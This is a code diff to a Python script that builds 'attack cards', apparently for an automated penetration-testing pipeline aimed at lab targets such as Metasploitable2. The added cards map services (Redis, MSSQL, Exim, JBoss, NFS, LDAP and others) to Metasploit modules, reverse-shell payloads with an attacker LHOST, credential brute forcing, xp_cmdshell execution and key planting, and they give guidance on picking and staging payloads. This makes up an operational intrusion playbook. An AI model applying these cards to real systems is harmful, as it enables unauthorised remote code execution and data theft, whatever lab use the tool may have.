@@ -420,7 +420,7 @@ def main():
         module="auxiliary/scanner/mysql/mysql_login",
         required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
         why="""  Metasploitable2 MySQL often has root with a BLANK password. After creds,
-  chain exploit/linux/mysql/mysql_udf_payload (strategy exploit_cve) for RCE.""",
+  chain exploit/multi/mysql/mysql_udf_payload (strategy exploit_cve) for RCE.""",
     ))
 
     cards.append(attack_card(
@@ -461,6 +461,176 @@ def main():
     nc <TARGET> 1524
   and you land directly as root. Then run 'id' to confirm.""",
         after_session="You are root immediately. Collect /etc/shadow, see post card.",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_snmp",
+        ports="161 (UDP)", banner_match='SNMP service on 161/udp',
+        keywords="snmp port 161 udp community public private enumeration leak",
+        strategy="enumeration",
+        module="auxiliary/scanner/snmp/snmp_enum",
+        required_options='    (none beyond RHOSTS/RPORT; default community is "public")',
+        why="""  SNMP with a known community string (often "public") leaks users, processes,
+  interfaces, routes, installed software and sometimes credentials. If "public"
+  fails, brute communities with auxiliary/scanner/snmp/snmp_login
+  (strategy brute_force). SNMP is UDP.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_ldap",
+        ports="389, 636", banner_match='LDAP service on 389 (636 LDAPS)',
+        keywords="ldap port 389 directory anonymous bind enumeration query login",
+        strategy="enumeration",
+        module="auxiliary/gather/ldap_query",
+        required_options='    (set the base DN if known; try an anonymous bind first)',
+        why="""  Many LDAP servers allow ANONYMOUS bind -> dump the directory (users, groups,
+  sometimes password hashes/descriptions). If bind requires creds, brute with
+  auxiliary/scanner/ldap/ldap_login (strategy brute_force).""",
+        alt_ports="636 = LDAPS (set SSL true); 3268/3269 = Global Catalog.",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_nfs",
+        ports="2049, 111", banner_match='nfs / rpcbind / mountd',
+        keywords="nfs port 2049 111 rpcbind mountd exports showmount mount shares",
+        strategy="enumeration",
+        module="auxiliary/scanner/nfs/nfsmount",
+        required_options='    (none beyond RHOSTS/RPORT)',
+        why="""  Lists exported shares and who may mount them. A world-readable/writable export
+  is a foothold: read /etc, or drop an SSH key / cron. If the share is writable
+  this is TIER C (manual): mount it and plant a key/payload.""",
+        if_missing="""  TIER C (missing_module_manual_poc): 'showmount -e <TARGET>' then
+  'mount -t nfs <TARGET>:/<export> /mnt' and read/write files.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_dns",
+        ports="53", banner_match='DNS service on 53 (tcp/udp)',
+        keywords="dns port 53 zone transfer axfr enumeration subdomains",
+        strategy="enumeration",
+        module="auxiliary/gather/enum_dns",
+        required_options='    (set DOMAIN if known; enable zone transfer / AXFR)',
+        why="""  A misconfigured server allows a zone transfer (AXFR) that dumps every DNS
+  record -> internal hostnames and IPs (map for lateral movement). DNS itself is
+  rarely a direct shell; it is reconnaissance.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_mssql",
+        ports="1433", banner_match='Microsoft SQL Server on 1433',
+        keywords="mssql port 1433 sql server login brute xp_cmdshell sa payload",
+        strategy="brute_force",
+        module="auxiliary/scanner/mssql/mssql_login",
+        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
+        why="""  Classic weak creds: sa with blank/weak password. AFTER valid creds, get RCE
+  with auxiliary/admin/mssql/mssql_exec (enables xp_cmdshell, runs a command;
+  set USERNAME/PASSWORD/CMD) or exploit/windows/mssql/mssql_payload
+  (strategy exploit_cve, windows payload + LHOST/LPORT).""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_redis",
+        ports="6379", banner_match='Redis service on 6379',
+        keywords="redis port 6379 unauth replication rce config login nosql",
+        strategy="exploit_cve",
+        module="exploit/linux/redis/redis_replication_cmd_exec",
+        required_options='    "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  Redis is frequently UNAUTHENTICATED -> RCE via the replication/module-load
+  trick. First confirm access with auxiliary/scanner/redis/redis_server
+  (strategy enumeration). If it needs a password, brute with
+  auxiliary/scanner/redis/redis_login. Alt module: exploit/linux/redis/redis_unauth_exec.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_mongodb",
+        ports="27017", banner_match='MongoDB on 27017',
+        keywords="mongodb port 27017 nosql no-auth login dump database",
+        strategy="brute_force",
+        module="auxiliary/scanner/mongodb/mongodb_login",
+        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
+        why="""  MongoDB is very often deployed with NO authentication -> connect and dump all
+  databases (credentials, tokens). mongodb_login confirms access/creds. Loot is
+  data, not a shell; use found creds elsewhere.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_smtp_exim",
+        ports="25, 587", banner_match='SMTP banner shows a vulnerable "Exim"',
+        keywords="smtp port 25 exim string format cve-2010-4344 rce mail",
+        strategy="exploit_cve",
+        module="exploit/unix/smtp/exim4_string_format",
+        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  Vulnerable Exim 4.x (CVE-2010-4344) -> remote root. Only for Exim; a generic
+  Postfix/Sendmail banner is NOT this - there, stick to smtp_enum. Alt for
+  Dovecot-backed Exim: exploit/linux/smtp/exim4_dovecot_exec.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_jboss",
+        ports="8080, 80, 8443", banner_match='http-enum/title shows "JBoss"/jmx-console',
+        keywords="jboss port 8080 jmx-console deployer war java rce targeturi",
+        strategy="exploit_cve",
+        module="exploit/multi/http/jboss_maindeployer",
+        required_options='    "TARGETURI": "/", "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  First scan with auxiliary/scanner/http/jboss_vulnscan (strategy enumeration).
+  An exposed JMX/web-console lets you deploy a WAR -> RCE. Alt module:
+  exploit/multi/http/jboss_invoke_deploy. Set TARGETURI to the JBoss base path.""",
+    ))
+
+    cards.append(attack_card(
+        name="attack_guide_wordpress",
+        ports="80, 443", banner_match='http-enum found "/wp-login.php" or "/wp-content/"',
+        keywords="wordpress wp-login wp-content plugin theme xmlrpc enum rce cms",
+        strategy="enumeration",
+        module="auxiliary/scanner/http/wordpress_scanner",
+        required_options='    "TARGETURI": "/"',
+        why="""  WordPress core is rarely the bug; a PLUGIN/THEME is. Enumerate users/version
+  with wordpress_login_enum / wordpress_scanner, identify the plugin, then pick
+  its exploit via search (e.g. wp_file_manager_rce, wp_wpdiscuz_*). Set TARGETURI
+  to the WP root; many WP exploits need a php payload.""",
+    ))
+
+    # =====================================================================
+    # CONFIGURACAO DE PAYLOADS (por plataforma e staged vs stageless)
+    # =====================================================================
+    cards.append(format_tactical_card(
+        name="payload_families_by_platform",
+        keywords="payload platform linux windows php java python cmd meterpreter shell reverse bind",
+        description="Pick the payload FAMILY that matches the exploit's platform/arch.",
+        instructions="""
+        The payload MUST match the exploit's platform/arch (check 'show payloads').
+        Picking the wrong family -> "Invalid payload" or a shell that never runs.
+          - Linux x64 exploit  -> linux/x64/meterpreter/reverse_tcp
+                                   (fallback: linux/x64/shell_reverse_tcp)
+          - Linux x86 exploit  -> linux/x86/meterpreter/reverse_tcp
+          - Windows x64        -> windows/x64/meterpreter/reverse_tcp
+          - Windows x86        -> windows/meterpreter/reverse_tcp
+          - Command injection on Unix -> cmd/unix/reverse (or reverse_perl/reverse_bash)
+          - PHP web RCE / eval -> php/meterpreter/reverse_tcp (fallback php/reverse_php)
+          - Java app (RMI/JBoss/Tomcat/Jenkins) -> java/meterpreter/reverse_tcp
+          - Python RCE         -> python/meterpreter/reverse_tcp
+        All reverse_* payloads need "LHOST" (attacker) and "LPORT". bind_* and
+        backdoor/interact payloads do NOT (omit LHOST/LPORT).
+        """
+    ))
+
+    cards.append(format_tactical_card(
+        name="staged_vs_stageless_and_encoding",
+        keywords="staged stageless meterpreter shell inline encoding badchars reliability",
+        description="Staged vs stageless payloads and when encoding matters.",
+        instructions="""
+        STAGED (meterpreter/reverse_tcp): small stub pulls the rest over the net.
+        Powerful, but needs a stable connection and the handler up (the pipeline
+        sets DisablePayloadHandler=false). If a staged payload connects then dies,
+        try a STAGELESS/inline one:
+          - *_reverse_tcp (meterpreter)  ->  shell_reverse_tcp / shell/reverse_tcp
+          - php/meterpreter              ->  php/reverse_php (inline command shell)
+        ENCODING/BADCHARS: command/php payloads rarely need encoding. If you see
+        "All encoders failed to encode", the MODULE's BadChars are incompatible
+        with that payload type - do NOT keep swapping payloads of the SAME family;
+        switch to a cmd/generic payload or a different module (see
+        encoder_failure_and_badchars).
+        """
     ))
 
     # =====================================================================
